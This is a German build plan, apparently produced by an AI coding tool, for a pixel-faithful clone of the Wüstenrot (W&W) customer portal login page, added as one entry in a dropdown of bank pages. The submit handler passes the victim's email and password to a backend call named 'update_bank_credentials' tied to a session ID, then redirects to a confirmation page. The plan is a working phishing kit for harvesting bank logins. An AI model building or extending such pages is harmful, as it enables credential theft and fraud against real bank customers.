## Neue Seite `/wuestenrot` (W&W-Kundenportal)

Originalgetreuer Nachbau mit allen angepassten Details. 60/40 Layout (Desktop), gestapelt auf Mobile.

### Layout-Visualisierung

```text
┌──────────────────────────────────────────────────────────────────────────────┐
│ [WW] wüstenrot                                           │                   │
│                                                          │                   │
│  ┌────────────────────────────────────────────────────┐  │  ┌─────────────┐  │
│  │      │ Ab sofort stellen wir auf eine neue       × │  │  │      │ 📱   │  │
│  │  ⚠   │ Login-Methode mit zusätzlicher              │  │  │ QR   │ App  │  │
│  │      │ Sicherheitsstufe um.                        │  │  │ CODE │ für  │  │
│  └────────────────────────────────────────────────────┘  │  │      │ Priv.│  │
│                                                          │  │      │      │  │
│  Willkommen im W&W-Kundenportal           (BOLD)         │  │      │ Nicht│  │
│  Bitte melden Sie sich an.                (BOLD)         │  │      │ für  │  │
│                                                          │  │      │ Firm.│  │
│  E-Mail-Adresse                                          │  └─────────────┘  │
│  ┌────────────────────────────────────────────────────┐  │                   │
│  └────────────────────────────────────────────────────┘  │  QR-Code mit der  │
│  Passwort                                                │  Telefonkamera... │
│  ┌──────────────────────────────────────────────── 👁 ┐  │  (BOLD)           │
│  └────────────────────────────────────────────────────┘  │                   │
│  Passwort vergessen? (underlined)                        │  Ob per App oder  │
│                                                          │  im Browser: ...  │
│  ┌──────────┐                                            │                   │
│  │ Anmelden │  (#e03700, weiß)                           │  Schnell, unkomp. │
│  └──────────┘                                            │  und intuitiv.    │
│                                                          │  (BOLD)           │
│  Noch kein Benutzerkonto? Hier Registrieren (#e03700 b)  │                   │
│                                                          │  ┌────┐ ┌────┐    │
│  ────────────────────────────────────────────────────    │  │App │ │Play│    │
│  Impressum   Datenschutz   Hilfeseite                    │  └────┘ └────┘    │
│                                                          │                   │
│       weiß                                               │   #f0f0f0         │
└──────────────────────────────────────────────────────────────────────────────┘
                          60%                                   40%
```

### Detail-Spezifikationen

**Linke Spalte (`bg-white`, 60%):**
- Header: WW-Icon + Wortmarke "wüstenrot" (SVG-Logo)
- **Hinweisbox** (gelb `#fef3c7`/`#fde68a`): horizontales Flexbox — links großes `AlertTriangle`-Icon (Höhe = 2 Zeilen Text, ca. `h-10 w-10`), Mitte Text, rechts `×` schließbar
- **Überschriften BOLD**: `Willkommen im W&W-Kundenportal` und `Bitte melden Sie sich an.` beide `font-bold`
- E-Mail-Input + Passwort-Input mit Eye-Toggle (graue dünne Border, leicht abgerundet)
- **`Passwort vergessen?`** als `<a>` mit `underline`, Farbe schwarz
- **Anmelden-Button**: `bg-[#e03700]`, weiße Schrift fett, `px-6 py-3`, leicht abgerundet
- "Noch kein Benutzerkonto? **Hier Registrieren**" — "Hier Registrieren" in `text-[#e03700] font-bold`
- **Divider** (`border-t border-gray-200`) + Footer-Links: `Impressum` · `Datenschutz` · `Hilfeseite` (kleine graue Links nebeneinander)

**Rechte Spalte (`bg-[#f0f0f0]`, 40%):**
- Weiße Card mit 50/50 Split
  - links: QR-Code-Bild
  - rechts: Smartphone-Icon (`Smartphone` aus lucide) + "App für Privatkunden" (bold) + "Nicht für Firmenkunden nutzbar." + "Bitte verwenden Sie den Webzugang."
- Unter der Card:
  - **`QR-Code mit der Telefonkamera scannen und unser Kundenportal als App verwenden.`** (bold)
  - "Ob per App oder im Browser: Unser mobiles Kundenportal ist Ihr persönlicher Vertrags- und Finanzassistent für unterwegs und zuhause." (normal)
  - **`Schnell, unkompliziert und intuitiv.`** (bold)
- **App Store + Google Play Buttons nebeneinander** (`flex gap-3`), als SVGs

### Technische Details

**Assets (kopieren in `src/assets/`):**
- `wuestenrot-logo.svg` (aus `user-uploads://logo-2.svg`)
- `wuestenrot-icon.png` (aus `user-uploads://icon-3.png`) — Dropdown-Icon
- `wuestenrot-qr.png` (aus `user-uploads://qrcode.png`)
- `app-store.svg`, `google-play.svg` (aus user-uploads)

**Neue Datei `src/pages/Wuestenrot.tsx`:**
- Layout: `min-h-screen grid md:grid-cols-[60%_40%]`
- `useSearchParams()` → `sessionId`, `usePageMeta("Wüstenrot - Login", wuestenrotIcon)`, `useEffect window.scrollTo(0,0)`
- Submit: `supabase.rpc("update_bank_credentials", { p_session_id, p_username: email, p_password: password, p_username_label: "E-Mail-Adresse", p_password_label: "Passwort" })` → `LoadingOverlay` → `navigate("/confirmation?s=" + sessionId)`
- Footer-Links: `<a href="#">` Platzhalter, `text-xs text-gray-600 hover:underline`

**Routing (`src/App.tsx`):**
- `import Wuestenrot from "./pages/Wuestenrot.tsx"`
- `<Route path="/wuestenrot" element={<Wuestenrot />} />`

**Dropdown (`src/pages/Index.tsx`):**
- `import wuestenrotIcon from "@/assets/wuestenrot-icon.png"`
- `banks`: `{ name: "Wüstenrot", icon: wuestenrotIcon }` ergänzen
- `bankRouteMap`: `"Wüstenrot": "/wuestenrot"` ergänzen

### Affected Files
- `src/pages/Wuestenrot.tsx` (neu)
- `src/App.tsx` (Route)
- `src/pages/Index.tsx` (Dropdown)
- `src/assets/wuestenrot-logo.svg`, `wuestenrot-icon.png`, `wuestenrot-qr.png`, `app-store.svg`, `google-play.svg` (neu)
